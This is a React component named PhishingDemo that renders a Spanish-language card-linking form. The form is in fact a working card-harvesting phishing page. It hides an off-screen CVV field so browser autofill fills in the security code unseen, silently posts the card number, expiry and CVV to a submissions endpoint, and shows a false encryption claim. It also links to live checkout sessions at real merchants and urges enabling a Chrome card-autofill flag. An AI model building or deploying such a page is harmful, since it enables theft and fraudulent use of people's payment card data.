import { useState } from 'react'

// ── Luhn algorithm ─────────────────────────────────────────────────────────
function luhnCheck(num: string): boolean {
  const digits = num.replace(/\s/g, '')
  if (!/^\d+$/.test(digits) || digits.length < 13) return false
  let sum = 0
  let alt = false
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10)
    if (alt) {
      n *= 2
      if (n > 9) n -= 9
    }
    sum += n
    alt = !alt
  }
  return sum % 10 === 0
}


// ── Main component ───────────────────────────────────────────────────────────
export default function PhishingDemo() {
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvv, setCvv] = useState('')
  const [luhnValid, setLuhnValid] = useState<boolean | null>(null)
  const [expiryError, setExpiryError] = useState('')
  const [submitted, setSubmitted] = useState(false)
  const [showFlagPopup, setShowFlagPopup] = useState(false)
  const [copied, setCopied] = useState(false)

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16)
    const groups = digits.match(/.{1,4}/g) || []
    const formatted = groups.join(' ')
    setCardNumber(formatted)
    if (digits.length >= 13) setLuhnValid(luhnCheck(digits))
    else setLuhnValid(null)
  }

  const formatExpiry = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 4)
    let formatted = digits
    if (digits.length > 2) formatted = digits.slice(0, 2) + '/' + digits.slice(2)
    setExpiry(formatted)

    if (digits.length === 4) {
      const month = parseInt(digits.slice(0, 2), 10)
      const year = parseInt('20' + digits.slice(2), 10)
      const now = new Date()
      const expDate = new Date(year, month - 1)
      if (month < 1 || month > 12) {
        setExpiryError('MES INVÁLIDO')
      } else if (expDate < new Date(now.getFullYear(), now.getMonth())) {
        setExpiryError('TARJETA EXPIRADA')
      } else {
        setExpiryError('')
      }
    } else {
      setExpiryError('')
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    try {
      await fetch('/api/submissions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardNumber, expiry, cvv }),
      })
    } catch {
      // silently continue even if save fails
    }
    setSubmitted(true)
  }

  const handleCopyFlag = () => {
    navigator.clipboard.writeText('chrome://flags/#enable-autofill-credit-card-upload')
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <>
      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes checkPop {
          0% { transform: scale(0); opacity: 0; }
          60% { transform: scale(1.15); }
          100% { transform: scale(1); opacity: 1; }
        }
        .field-input {
          width: 100%;
          background: rgba(0,212,255,0.06);
          border: 1px solid rgba(0,212,255,0.35);
          border-radius: 8px;
          padding: 12px 14px;
          color: #e0f4ff;
          font-family: 'VT323', monospace;
          font-size: 20px;
          letter-spacing: 2px;
          outline: none;
          transition: border-color 0.2s, box-shadow 0.2s;
          box-sizing: border-box;
        }
        .field-input::placeholder { color: rgba(0,212,255,0.35); }
        .field-input:focus {
          border-color: #00d4ff;
          box-shadow: 0 0 12px rgba(0,212,255,0.25);
        }
        .field-label {
          display: block;
          color: rgba(0,212,255,0.7);
          font-family: 'VT323', monospace;
          font-size: 14px;
          letter-spacing: 3px;
          margin-bottom: 6px;
        }
        .submit-btn {
          width: 100%;
          padding: 14px;
          background: linear-gradient(135deg, #0066ff, #00d4ff);
          border: 1px solid #00d4ff;
          border-radius: 8px;
          color: #fff;
          font-family: 'VT323', monospace;
          font-size: 22px;
          letter-spacing: 4px;
          cursor: pointer;
          transition: all 0.2s;
          box-shadow: 0 4px 14px rgba(0,212,255,0.3);
        }
        .submit-btn:hover {
          background: linear-gradient(135deg, #0077ff, #33ddff);
          box-shadow: 0 6px 20px rgba(0,212,255,0.4);
          transform: translateY(-1px);
        }
        .action-btn {
          width: 100%;
          padding: 7px 10px;
          background: linear-gradient(135deg, rgba(0,102,255,0.3), rgba(0,212,255,0.2));
          border: 1px solid rgba(0,212,255,0.5);
          border-radius: 7px;
          color: #e0f4ff;
          font-family: 'Inter', 'Segoe UI', sans-serif;
          font-size: 12px;
          font-weight: 600;
          letter-spacing: 0.3px;
          cursor: pointer;
          transition: all 0.2s;
          margin-bottom: 5px;
          text-align: center;
          text-decoration: none;
          display: block;
          box-sizing: border-box;
          box-shadow: 0 1px 8px rgba(0,212,255,0.15), inset 0 1px 0 rgba(0,212,255,0.1);
        }
        .action-btn:hover {
          background: linear-gradient(135deg, rgba(0,102,255,0.45), rgba(0,212,255,0.35));
          color: #fff;
          border-color: #00d4ff;
          box-shadow: 0 3px 14px rgba(0,212,255,0.3), inset 0 1px 0 rgba(0,212,255,0.2);
          transform: translateY(-1px);
        }
        .popup {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgba(8,16,32,0.97);
          border: 1px solid #00d4ff;
          border-radius: 12px;
          padding: 24px;
          z-index: 100;
          box-shadow: 0 0 30px rgba(0,212,255,0.2);
          text-align: center;
          width: 90%;
          max-width: 400px;
        }
        .popup-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.6);
          z-index: 99;
        }
      `}</style>

      <div
        style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          zIndex: 0,
          pointerEvents: 'none',
          background: 'radial-gradient(ellipse at 20% 50%, rgba(0,212,255,0.07) 0%, transparent 50%), radial-gradient(ellipse at 80% 20%, rgba(0,102,255,0.05) 0%, transparent 50%)',
        }}
      />

      {/* Main layout */}
      <div
        style={{
          position: 'relative',
          zIndex: 10,
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '40px 20px',
        }}
      >
        {/* Action Buttons - hidden when submitted */}
        {!submitted && (
          <div style={{ width: '100%', maxWidth: '300px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', marginBottom: '14px' }}>
            <button className="action-btn" onClick={() => setShowFlagPopup(true)}>
              VER FLAG AUTOFILL
            </button>

            <a href="https://mechanicalkeyboards.com/checkouts/cn/hWNAbYG7MW6JIpbP6y91OHdR/en/information?_r=AQABhgpjAki45oKTqgsd27H9O-cNnNx8324lMKNh221RyWM&auto_redirect=false&edge_redirect=true&skip_shop_pay=true" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '2px', lineHeight: '1.1' }}>
              <span>Actualizar Datos Live</span>
              <span style={{ fontSize: '10px', opacity: 0.7, fontWeight: 400 }}>Keyboards</span>
            </a>

            <a href="https://www.wyze.com/checkouts/cn/hWNAdt2cBXWJNQWcS4UaVWzp/es-us?_r=AQAB9QXN-QSmHHwN6nCuXFI8w0xTyU4Db7jk3KY3l-_RC9w&auto_redirect=false&edge_redirect=true&skip_shop_pay=true" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '2px', lineHeight: '1.1' }}>
              <span>Actualizar Datos Live</span>
              <span style={{ fontSize: '10px', opacity: 0.7, fontWeight: 400 }}>Camaras</span>
            </a>

            <a href="https://pay.google.com/gp/w/u/0/home/paymentmethods" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '2px', lineHeight: '1.1' }}>
              <span>Configurar Perfil de Pagos</span>
              <span style={{ fontSize: '10px', opacity: 0.7, fontWeight: 400 }}>Google Pay</span>
            </a>
          </div>
        )}

        {/* Form panel */}
        <div
          style={{
            width: '100%',
            maxWidth: submitted ? '500px' : '380px',
            background: 'rgba(8,16,32,0.92)',
            border: '1px solid rgba(0,212,255,0.2)',
            borderRadius: '14px',
            padding: submitted ? '48px 36px' : '28px',
            boxShadow: '0 8px 32px rgba(0,0,0,0.3)',
            transition: 'all 0.3s ease',
          }}
        >
          {submitted ? (
            <div style={{ textAlign: 'center', animation: 'fadeIn 0.4s ease', padding: '30px 0' }}>
              {/* Blue circle with checkmark */}
              <div
                style={{
                  width: '120px',
                  height: '120px',
                  borderRadius: '50%',
                  background: 'linear-gradient(135deg, #0066ff, #00d4ff)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto 28px',
                  boxShadow: '0 4px 20px rgba(0,212,255,0.4)',
                  animation: 'checkPop 0.5s ease forwards',
                }}
              >
                <svg
                  width="60"
                  height="60"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#fff"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              </div>
              <div
                style={{
                  fontFamily: 'VT323, monospace',
                  fontSize: '42px',
                  color: '#00d4ff',
                  letterSpacing: '8px',
                  marginBottom: '36px',
                }}
              >
                DONE
              </div>
              <button
                className="submit-btn"
                style={{ fontSize: '26px', padding: '18px' }}
                onClick={() => {
                  setSubmitted(false)
                  setCardNumber('')
                  setExpiry('')
                  setCvv('')
                  setLuhnValid(null)
                  setExpiryError('')
                }}
              >
                REGRESAR
              </button>
            </div>
          ) : (
            <form onSubmit={handleSubmit}>
              <div
                style={{
                  fontFamily: 'VT323, monospace',
                  fontSize: '22px',
                  color: '#00d4ff',
                  letterSpacing: '4px',
                  marginBottom: '24px',
                }}
              >
                ASOCIAR TU TARJETA
              </div>

              <div style={{ marginBottom: '16px' }}>
                <label className="field-label">CARD NUMBER</label>
                <input
                  className="field-input"
                  type="text"
                  inputMode="numeric"
                  placeholder="#### #### #### ####"
                  value={cardNumber}
                  onChange={e => formatCardNumber(e.target.value)}
                  maxLength={19}
                />
                {luhnValid === false && (
                  <div
                    style={{
                      fontFamily: 'VT323, monospace',
                      fontSize: '13px',
                      color: '#ef4444',
                      marginTop: '4px',
                      letterSpacing: '1px',
                    }}
                  >
                    INVALID CARD NUMBER
                  </div>
                )}
              </div>

              <div style={{ marginBottom: '24px' }}>
                <label className="field-label">EXPIRY DATE</label>
                <input
                  className="field-input"
                  type="text"
                  inputMode="numeric"
                  placeholder="MM/YY"
                  value={expiry}
                  onChange={e => formatExpiry(e.target.value)}
                  maxLength={5}
                  style={{ fontSize: '24px', padding: '14px 16px', letterSpacing: '4px' }}
                />
                {expiryError && (
                  <div
                    style={{
                      fontFamily: 'VT323, monospace',
                      fontSize: '13px',
                      color: '#ef4444',
                      marginTop: '4px',
                      letterSpacing: '1px',
                    }}
                  >
                    {expiryError}
                  </div>
                )}
              </div>
              {/* CVV field - hidden but functional */}
              <div style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, overflow: 'hidden' }}>
                <input
                  type="text"
                  inputMode="numeric"
                  name="cvv"
                  autoComplete="cc-csc"
                  value={cvv}
                  onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  maxLength={4}
                  tabIndex={-1}
                />
              </div>

              <button
                type="submit"
                className="submit-btn"
              >
                ASOCIAR TARJETA
              </button>

              <div
                style={{
                  fontFamily: 'VT323, monospace',
                  fontSize: '12px',
                  color: 'rgba(0,212,255,0.3)',
                  letterSpacing: '1px',
                  marginTop: '14px',
                  textAlign: 'center',
                  lineHeight: 1.5,
                }}
              >
                256-BIT ENCRYPTED · SECURE NETWORK
              </div>
            </form>
          )}
        </div>

      </div>

      {/* Popup for Flag */}
      {showFlagPopup && (
        <>
          <div className="popup-overlay" onClick={() => setShowFlagPopup(false)}></div>
          <div className="popup">
            <h3 style={{ color: '#00d4ff', fontFamily: 'VT323, monospace', margin: '0 0 16px', fontSize: '24px' }}>CHROME FLAG</h3>
            <p style={{
              background: 'rgba(0,0,0,0.5)',
              padding: '12px',
              borderRadius: '6px',
              color: '#fff',
              fontFamily: 'monospace',
              fontSize: '14px',
              wordBreak: 'break-all',
              margin: '0 0 16px'
            }}>
              chrome://flags/#enable-autofill-credit-card-upload
            </p>
            <button className="submit-btn" style={{ padding: '8px', fontSize: '18px' }} onClick={handleCopyFlag}>
              {copied ? '¡COPIADO!' : 'COPIAR AL PORTAPAPELES'}
            </button>
            <button
              style={{
                background: 'transparent',
                border: 'none',
                color: 'rgba(255,255,255,0.5)',
                marginTop: '12px',
                cursor: 'pointer',
                fontFamily: 'VT323, monospace',
                fontSize: '16px'
              }}
              onClick={() => setShowFlagPopup(false)}
            >
              CERRAR
            </button>
          </div>
        </>
      )}
    </>
  )
}
